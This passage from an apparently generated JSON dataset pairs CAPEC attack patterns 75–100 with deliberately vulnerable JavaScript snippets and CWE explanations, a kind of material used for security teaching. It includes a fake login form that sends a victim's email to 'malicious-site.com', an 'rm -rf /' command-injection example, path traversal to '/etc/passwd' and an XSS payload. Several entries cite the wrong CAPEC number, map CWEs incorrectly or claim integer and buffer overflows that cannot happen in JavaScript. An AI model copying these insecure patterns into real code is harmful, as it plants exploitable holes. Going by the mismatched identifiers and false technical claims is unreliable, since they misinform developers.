        "code_snippet": "const fs = require('fs');\nconst configFilePath = './config.json';\n\n// Read the configuration file\nlet configData = fs.readFileSync(configFilePath, 'utf8');\n\n// Parse the configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON format in configuration file');\n  process.exit(1);\n}\n\n// Use the configuration data\nconst dbConnection = `mysql://${config.dbUser}:${config.dbPassword}@${config.dbHost}/${config.dbName}`;\n\n// Execute a command using the configuration data\nconst exec = require('child_process').exec;\nexec(`mysql -u ${config.dbUser} -p${config.dbPassword} -h ${config.dbHost} ${config.dbName} < backup.sql`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to manipulating writable configuration files. The code reads a configuration file (config.json) and uses its contents to construct a database connection string and execute a command. The main idea of the CAPEC is represented by the fact that if an attacker can modify the configuration file, they can inject malicious data. The related CWEs are illustrated as follows:\n\n1. CWE-349: The code accepts and processes untrusted data from the configuration file without validation.\n2. CWE-99: The code uses input from the configuration file to construct a resource identifier (database connection string) without proper restrictions.\n3. CWE-77: The code constructs a command using data from the configuration file, which could lead to command injection if the data is malicious.\n4. CWE-346: The code does not validate the source of the configuration data.\n5. CWE-353 and CWE-354: The code does not include or validate integrity checks for the configuration data, making it susceptible to tampering."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst path = require('path');\nconst app = express();\n\napp.get('/read-file', (req, res) => {\n  const filePath = path.join(__dirname, 'files', req.query.filename);\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading file');\n    }\n    res.send(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that reads and returns the contents of a file specified by the user through a query parameter. The code is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Relative Path Traversal (CWE-23)**: The `req.query.filename` input is directly used to construct the file path without proper validation or neutralization of special sequences like `..`, allowing an attacker to traverse directories and access files outside the intended directory.\n\n2. **Improper Limitation of a Pathname to a Restricted Directory (CWE-22)**: The code does not ensure that the constructed path remains within a restricted directory, potentially exposing sensitive files.\n\n3. **External Control of File Name or Path (CWE-73)**: The file path is influenced by user input, which can be manipulated to access unintended files.\n\n4. **Improper Neutralization of Special Elements used in a Command (CWE-77)**: Although not directly constructing a command, the lack of input validation can lead to unintended file access, similar to command injection vulnerabilities.\n\nThe main idea represented by this code is the manipulation of web input to file system calls, demonstrating how improper handling of user input can lead to unauthorized file system access."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let params = new URL(req.url, `http://${req.headers.host}`).searchParams;\n  let debugMode = params.get('debug');\n  let userRole = params.get('role');\n\n  // Vulnerable code: directly using user-controlled variables\n  if (debugMode === '1') {\n    console.log('Debug mode is ON');\n  }\n\n  if (userRole === 'admin') {\n    console.log('Admin privileges granted');\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Response based on user-controlled variables');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads query parameters from the URL. It demonstrates the vulnerability of manipulating user-controlled variables by directly using the 'debug' and 'role' parameters without any sanitization or validation. If 'debug' is set to '1', it enables debug mode, and if 'role' is set to 'admin', it grants admin privileges. This code is vulnerable to attacks where an adversary can manipulate these parameters to change the application's behavior, potentially leading to unauthorized access or other security issues. This example embodies the main idea of CAPEC-15 and related CWEs, such as CWE-285 (Improper Authorization) and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization (CWE-180)\n  if (!filePath || typeof filePath !== 'string') {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = filePath.replace(/\\\\/g, '/');\n\n  // Validate the canonicalized path (CWE-20)\n  if (!canonicalPath.startsWith('/safe/directory/')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file (CWE-22, CWE-73)\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('..\\\\etc\\\\passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the use of escaped slashes in alternate encoding, as described in the CAPEC. The function `readFile` takes a file path as input and attempts to read the file. Initially, it validates the input to ensure it is a string (CWE-180). It then canonicalizes the path by replacing backslashes with forward slashes. After canonicalization, it validates the path again to ensure it does not lead to a path traversal attack (CWE-20, CWE-22). Finally, it attempts to read the file using the `fs.readFile` method. This code is vulnerable because it does not properly handle alternate encodings and may allow an attacker to bypass the validation checks, leading to potential path traversal or injection attacks (CWE-73, CWE-74)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  // Validate input (CWE-20)\n  if (!userInput || typeof userInput !== 'string') {\n    throw new Error('Invalid input');\n  }\n\n  // Canonicalize the path (CWE-180)\n  const canonicalPath = path.normalize(userInput);\n\n  // Validate the canonicalized path (CWE-22)\n  if (canonicalPath.includes('..')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file (CWE-73)\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: 'Using Slashes in Alternate Encoding'. The function `readFile` takes user input to read a file from the filesystem. The code attempts to validate the input and canonicalize the path, but it does so in an incorrect order (CWE-180). It also fails to properly neutralize special elements (CWE-74) and does not correctly handle alternate encodings of slashes (CWE-173). This can lead to path traversal attacks (CWE-22), where an attacker can manipulate the input to access sensitive files outside the intended directory. The example usage demonstrates a potential attack by attempting to read the '/etc/passwd' file using a relative path."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  let userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input (decode UTF-8)\n  userInput = decodeURIComponent(escape(userInput));\n  // Use the input in a file path\n  const filePath = `/uploads/${userInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to ensure it only contains alphanumeric characters, and then canonicalizes the input by decoding it from UTF-8. The validated and canonicalized input is then used to construct a file path. This code embodies the main idea of CAPEC-Using UTF-8 Encoding to Bypass Validation Logic by demonstrating how improper handling of alternate encodings (CWE-173) and incorrect behavior order (CWE-180) can lead to vulnerabilities. Specifically, the input is validated before it is canonicalized, which can allow malicious input to bypass validation checks if it is encoded in UTF-8."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logEntry + '\\n', (err) => {\n    if (err) throw err;\n  });\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs each request to a file named 'server.log'. The log entry includes the current timestamp, HTTP method, URL, and user-agent header. However, the code is vulnerable to log tampering attacks (CAPEC-117) because it does not properly neutralize or sanitize the input data before writing it to the log file. An attacker could inject malicious data into the log file, potentially masking other malicious activities or targeting log processing agents. This vulnerability is related to several CWEs, including CWE-117 (Improper Output Neutralization for Logs), CWE-93 (CRLF Injection), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library without any validation against a schema, making it vulnerable to several XML-related attacks such as XML Injection (CWE-91), XML External Entity (XXE) attacks (CWE-611), and XML Entity Expansion (CWE-776). The code demonstrates the main idea of the deprecated CAPEC by showing how improper handling of XML content can lead to security vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xmlData = '<users><user><id>1</id><name>John Doe</name></user><user><id>2</id><name>Jane Doe</name></user></users>';\n  const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n  const doc = new dom().parseFromString(xmlData);\n  const nodes = xpath.select(userInput, doc);\n  res.send(nodes.toString());\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js that is susceptible to XPath Injection. The application accepts user input from a POST request to the '/search' endpoint and uses it directly in an XPath query to search an XML document. The user input is not sanitized or validated, allowing an attacker to inject malicious XPath expressions. This can lead to unauthorized access to data or bypassing authentication mechanisms. The code embodies the main idea of CAPEC-91 (XPath Injection) and related CWEs, highlighting the risks of improper input validation and neutralization in dynamic XPath expressions."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xquery = `for $x in doc('users.xml')/users/user where $x/name = '${userInput}' return $x`;\n  fs.readFile('users.xml', 'utf8', (err, data) => {\n    if (err) throw err;\n    xml2js.parseString(data, (err, result) => {\n      if (err) throw err;\n      // Simulate XQuery execution (vulnerable to injection)\n      const users = result.users.user.filter(user => user.name[0] === userInput);\n      res.send(users);\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js. The application reads user input from a POST request and constructs an XQuery expression without proper input validation or neutralization. The XQuery expression is used to search an XML file for user data. This code is vulnerable to XQuery Injection (CWE-652) because it directly incorporates user input into the query, allowing an attacker to manipulate the query structure. The code also highlights related weaknesses such as improper neutralization of special elements (CWE-74) and improper input handling (CWE-707)."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function fetchUserData(userId) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', '/getUserData?id=' + userId, true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4 && xhr.status === 200) {\n            var userData = JSON.parse(xhr.responseText);\n            document.getElementById('user-info').innerHTML = userData.name;\n        }\n    };\n    xhr.send();\n}\n\n// Example usage\nfetchUserData('<script>alert(1)</script>');",
        "description": "This JavaScript code snippet demonstrates an AJAX request to fetch user data based on a user ID. The function `fetchUserData` sends a GET request to the server with the user ID as a query parameter. The server's response is then parsed and inserted into the HTML element with the ID 'user-info'. This code is vulnerable to several issues highlighted in the CAPEC and related CWEs:\n\n1. **CWE-79 (Cross-site Scripting)**: The user input (`userId`) is not properly sanitized or encoded before being included in the HTML output, making it susceptible to XSS attacks.\n2. **CWE-20 (Improper Input Validation)**: The input is not validated to ensure it meets the expected format or type, allowing potentially malicious input to be processed.\n3. **CWE-116 (Improper Encoding or Escaping of Output)**: The output is directly inserted into the HTML without proper encoding, which can lead to XSS vulnerabilities.\n4. **CWE-348 (Use of Less Trusted Source)**: The code assumes the server response is trustworthy without verifying its integrity.\n\nThe code snippet embodies the main idea of AJAX Footprinting by demonstrating how frequent client-server interactions can be exploited if proper security measures are not in place."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Extracting a header value from the request\n  let userHeader = req.headers['x-custom-header'];\n\n  // Vulnerable code: directly using the header value in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><a href='${userHeader}'>Click here</a></body></html>`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server extracts a custom header ('x-custom-header') from incoming HTTP requests and directly uses its value to generate an HTML link. This is a vulnerable practice because the header value is not properly sanitized or validated, allowing an attacker to inject malicious scripts. This embodies the main idea of CAPEC-86 (XSS Through HTTP Headers) and is related to several CWEs, such as CWE-80, CWE-79, and CWE-644, which describe improper neutralization of input and script-related HTML tags. The code demonstrates how an attacker could exploit this vulnerability to perform cross-site scripting (XSS) attacks."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'user1': { role: 'admin' },\n  'user2': { role: 'user' }\n};\n\n// Middleware to simulate authentication\napp.use((req, res, next) => {\n  const userId = req.query.userId;\n  if (users[userId]) {\n    req.user = users[userId];\n  }\n  next();\n});\n\n// Route without proper authorization check\napp.get('/admin', (req, res) => {\n  if (req.user && req.user.role === 'admin') {\n    res.send('Welcome to the admin panel');\n  } else {\n    res.send('Access denied');\n  }\n});\n\n// Route vulnerable to forceful browsing\napp.get('/admin/settings', (req, res) => {\n  res.send('Admin settings page');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet demonstrates a basic Express.js application with a simulated authentication mechanism. The '/admin' route checks if the user has an 'admin' role before granting access. However, the '/admin/settings' route does not perform any authorization checks, making it vulnerable to forceful browsing (CWE-425). An attacker can directly access '/admin/settings' by entering the URL, bypassing any role-based access control. This example highlights the importance of enforcing proper authorization checks on all restricted URLs to prevent unauthorized access."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // User input is directly used in the command",
        "description": "This JavaScript code snippet demonstrates an OS Command Injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to OS Command Injection because the user input is not properly sanitized or validated, allowing an attacker to inject arbitrary commands. For example, if an attacker provides `; rm -rf /`, it could lead to the deletion of the entire filesystem. This snippet embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'trustedbank.com';\n  const targetIP = '192.168.1.100';\n\n  dns.reverse(req.connection.remoteAddress, (err, hostnames) => {\n    if (err || !hostnames.includes(targetHost)) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n      return;\n    }\n\n    http.get(`http://${targetIP}`, (resp) => {\n      let data = '';\n      resp.on('data', (chunk) => { data += chunk; });\n      resp.on('end', () => {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      });\n    }).on('error', () => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that attempts to validate the client's hostname using reverse DNS resolution before allowing access to a supposedly trusted site. The server checks if the client's IP address resolves to 'trustedbank.com' and then proxies the request to the target IP '192.168.1.100'. This code is vulnerable to pharming attacks because it relies on reverse DNS resolution (CWE-350) and does not properly verify the origin of the data (CWE-346). An attacker could manipulate DNS responses to impersonate the trusted site, leading the victim to enter sensitive data into a malicious site. Additionally, the code does not perform any integrity checks on the data received from the target IP (CWE-494), further increasing the risk."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Simple challenge-response mechanism\n    if (data.toString() === 'CHALLENGE') {\n      socket.write('RESPONSE');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nclient.connect(1337, '127.0.0.1', () => {\n  // Reflection attack: send challenge to server\n  client.write('CHALLENGE');\n\n  client.on('data', (data) => {\n    if (data.toString() === 'RESPONSE') {\n      console.log('Authenticated as legitimate user');\n    }\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a simple challenge-response authentication mechanism that is vulnerable to a reflection attack. The server listens for a 'CHALLENGE' message and responds with 'RESPONSE'. The client, acting as an attacker, sends the 'CHALLENGE' message to the server and receives the 'RESPONSE', which it then uses to authenticate itself as a legitimate user. This reflects the main idea of CAPEC-301, where an adversary can abuse an authentication protocol susceptible to reflection attacks to gain illegitimate access. The code also touches on related CWEs, such as incorrect implementation of the authentication algorithm (CWE-303) and authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "<html>\n<body>\n  <form action=\"/submit\" method=\"post\">\n    <label for=\"imageUrl\">Image URL:</label>\n    <input type=\"text\" id=\"imageUrl\" name=\"imageUrl\">\n    <input type=\"submit\" value=\"Submit\">\n  </form>\n  <div id=\"imageContainer\"></div>\n  <script>\n    document.querySelector('form').addEventListener('submit', function(event) {\n      event.preventDefault();\n      var imageUrl = document.getElementById('imageUrl').value;\n      document.getElementById('imageContainer').innerHTML = '<img src=\"' + imageUrl + '\" />';\n    });\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a vulnerable web application where user input is directly inserted into an IMG tag's src attribute without proper sanitization. The form allows users to submit an image URL, which is then used to dynamically create an IMG element. This is a classic example of improper neutralization of script in attributes of IMG tags (CWE-82). An attacker could exploit this by submitting a malicious URL containing JavaScript code, leading to an XSS attack. The code also highlights the risk of incomplete denylist (CWE-692) and improper neutralization of script-related HTML tags (CWE-80), as it does not sanitize the input to prevent script execution."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function allocateBuffer(size) {\n  // CWE-190: Integer Overflow or Wraparound\n  var bufferSize = size + 1;\n  \n  // CWE-680: Integer Overflow to Buffer Overflow\n  var buffer = new ArrayBuffer(bufferSize);\n  var view = new Uint8Array(buffer);\n  \n  // CWE-120: Buffer Copy without Checking Size of Input\n  for (var i = 0; i <= size; i++) {\n    view[i] = 0x41; // Fill buffer with 'A'\n  }\n  \n  return buffer;\n}\n\n// Example usage\nvar size = 0xFFFFFFFF; // Large value to cause overflow\nvar buffer = allocateBuffer(size);",
        "description": "This JavaScript code snippet demonstrates a forced integer overflow vulnerability. The function `allocateBuffer` takes a `size` parameter and attempts to allocate a buffer of `size + 1` bytes. If `size` is set to a large value (e.g., 0xFFFFFFFF), adding 1 causes an integer overflow, resulting in a very small or negative buffer size. This can lead to a buffer overflow when the code attempts to fill the buffer with data. The code embodies the main idea of the CAPEC by showing how an attacker can manipulate an integer variable to cause unexpected behavior, potentially leading to arbitrary code execution."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Vulnerable log entry\n  fs.appendFile('server.log', `User: ${username} attempted login with password: ${password}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  res.send('Login attempt logged');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable logging mechanism in an Express.js application. The code logs user login attempts, including the username and password, directly into a log file without any sanitization or neutralization of special characters. This can lead to several issues as described in the CAPEC and related CWEs:\n\n1. **Improper Output Neutralization for Logs (CWE-117)**: The log entry directly includes user input without neutralizing special characters, which could allow an attacker to inject malicious log entries.\n2. **Failure to Sanitize Special Elements (CWE-75)**: The user input is not sanitized, allowing special elements to be logged, which could be exploited for log injection attacks.\n3. **Improper Neutralization of Escape, Meta, or Control Sequences (CWE-150)**: The code does not handle escape sequences, which could be used to manipulate log files.\n4. **Insertion of Sensitive Information into Log File (CWE-532)**: Sensitive information, such as passwords, is logged, which could be exploited if the log file is accessed by an attacker.\n5. **Logging of Excessive Data (CWE-779)**: Logging sensitive information like passwords can lead to excessive and sensitive data being stored in log files, complicating forensic analysis and recovery efforts.\n\nOverall, this code snippet highlights the risks associated with improper logging practices and the importance of sanitizing and neutralizing user input before logging it."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const http = require('http');\nconst net = require('net');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const target = url.parse(req.url);\n  const proxy = net.createConnection({ host: target.hostname, port: 80 }, () => {\n    proxy.write(\n      `${req.method} ${target.path} HTTP/1.1\\r\\n` +\n      `Host: ${target.hostname}\\r\\n` +\n      `Connection: close\\r\\n\\r\\n`\n    );\n  });\n\n  proxy.on('data', (chunk) => {\n    // Potentially modify the data here\n    res.write(chunk);\n  });\n\n  proxy.on('end', () => {\n    res.end();\n  });\n\n  req.on('data', (chunk) => {\n    // Potentially capture and replay the data here\n    proxy.write(chunk);\n  });\n\n  req.on('end', () => {\n    proxy.end();\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The proxy server intercepts HTTP requests and forwards them to the target server. The proxy can potentially modify the data being transmitted (representing CWE-300: Channel Accessible by Non-Endpoint) and capture and replay the data (representing CWE-294: Authentication Bypass by Capture-replay). This embodies the main idea of the CAPEC 'Adversary in the Middle (AiTM)' by placing the adversary within the communication channel between the client and server, allowing them to alter or obtain data from the transactions."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "const http = require('http');\nconst url = 'http://example.com/service?wsdl';\n\nhttp.get(url, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('WSDL Content:', data);\n    // Example of extracting sensitive information\n    const sensitiveInfo = data.match(/<wsdl:documentation>(.*?)<\\/wsdl:documentation>/);\n    if (sensitiveInfo) {\n      console.log('Sensitive Information:', sensitiveInfo[1]);\n    }\n  });\n}).on('error', (err) => {\n  console.error('Error fetching WSDL:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates how an attacker might scan a WSDL interface to extract sensitive information. The code sends an HTTP GET request to a WSDL URL, retrieves the WSDL content, and then searches for sensitive information within the WSDL file. This embodies the main idea of CAPEC-111 (WSDL Scanning) by showing how an attacker can access and parse a WSDL file to gather information that could be used for further attacks. The code also highlights CWE-651 (Exposure of WSDL File Containing Sensitive Information) by demonstrating the potential exposure of sensitive data within the WSDL file."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfigFile(filePath) {\n  try {\n    if (!fs.existsSync(filePath)) {\n      throw new Error('Configuration file not found');\n    }\n    const data = fs.readFileSync(filePath, 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err.message);\n    // Fallback to default configuration\n    return { defaultConfig: true };\n  }\n}\n\nconst config = readConfigFile('/path/to/config.json');\nconsole.log('Configuration:', config);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to read a configuration file using the 'fs' library. The code checks if the file exists and reads its content. If the file is not found or an error occurs during reading, it catches the error and logs it, then falls back to a default configuration. This represents the CAPEC idea of handling blocked access to libraries (in this case, the file system library) and ensuring the application does not enter an insecure state. The related CWEs are illustrated by the potential use of a non-ubiquitous API (CWE-589), improper error handling that could lead to insecure states (CWE-119), and reliance on external libraries (CWE-829)."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nconst algorithm = 'des-ecb'; // DES is considered broken and risky\nconst key = crypto.randomBytes(8); // DES key size is 8 bytes\nconst iv = Buffer.alloc(8, 0); // Weak IV (CWE-1204)\n\nconst cipher = crypto.createCipheriv(algorithm, key, iv);\nlet encrypted = cipher.update('Sensitive Data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\n\nconsole.log('Encrypted:', encrypted);\n\n// Using a predictable random number generator (CWE-1241)\nfunction predictableRandom() {\n  return Math.floor(Math.random() * 100); // Predictable RNG\n}\n\nconsole.log('Predictable Random Number:', predictableRandom());",
        "description": "This JavaScript code snippet demonstrates several cryptographic weaknesses that align with the CAPEC description of Cryptanalysis. The code uses the DES algorithm ('des-ecb'), which is known to be broken and risky (CWE-327). It also uses a weak initialization vector (IV) by setting it to a buffer of zeros (CWE-1204). Additionally, the code includes a function that generates a predictable random number using Math.random(), which is not suitable for cryptographic purposes (CWE-1241). These weaknesses can make the cryptographic operations vulnerable to attacks, illustrating the main idea of finding and exploiting weaknesses in cryptographic algorithms and their implementations."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function redirectToPhishingSite() {\n  var userInput = prompt('Please enter your email to continue:');\n  var redirectUrl = 'http://malicious-site.com/login?email=' + encodeURIComponent(userInput);\n  window.location.href = redirectUrl;\n}\n\nfunction displayFakeLogin() {\n  document.body.innerHTML = '<h2>Login to Your Account</h2><form onsubmit=\"redirectToPhishingSite(); return false;\"><input type=\"text\" placeholder=\"Email\" required><input type=\"password\" placeholder=\"Password\" required><button type=\"submit\">Login</button></form>';\n}\n\ndisplayFakeLogin();",
        "description": "This JavaScript code snippet demonstrates a phishing attack by creating a fake login form that prompts the user to enter their email and password. When the form is submitted, the user is redirected to a malicious site with their email as a query parameter. This embodies the main idea of phishing (CAPEC) by masquerading as a legitimate login form to gather confidential information. The code also incorporates CWE-601 (URL Redirection to Untrusted Site) by redirecting the user to a malicious URL, and CWE-451 (User Interface Misrepresentation of Critical Information) by displaying a fake login form that misrepresents its true purpose."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js server that accepts XML data via a POST request. The XML data is parsed using the xml2js library without proper validation or security measures, making it vulnerable to several XML-related attacks. Specifically, it embodies the main idea of the deprecated CAPEC-83: XML Parser Attack, which includes vulnerabilities like XML Injection (CWE-91), Missing XML Validation (CWE-112), and Improper Restriction of XML External Entity Reference (CWE-611). The code does not validate the XML against a schema, nor does it neutralize special elements, making it susceptible to malicious XML payloads."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input[i];\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20);\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerableFunction` takes an `input` string and attempts to copy its contents into a fixed-size array `buffer` of length 10. The loop iterates over the length of the input, which can exceed the size of the buffer, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code does not check if the input length exceeds the buffer size, allowing an adversary to write past the boundaries of the allocated buffer, potentially causing a program crash or other unintended behavior."
    },
    {
        "capec_id": "101",
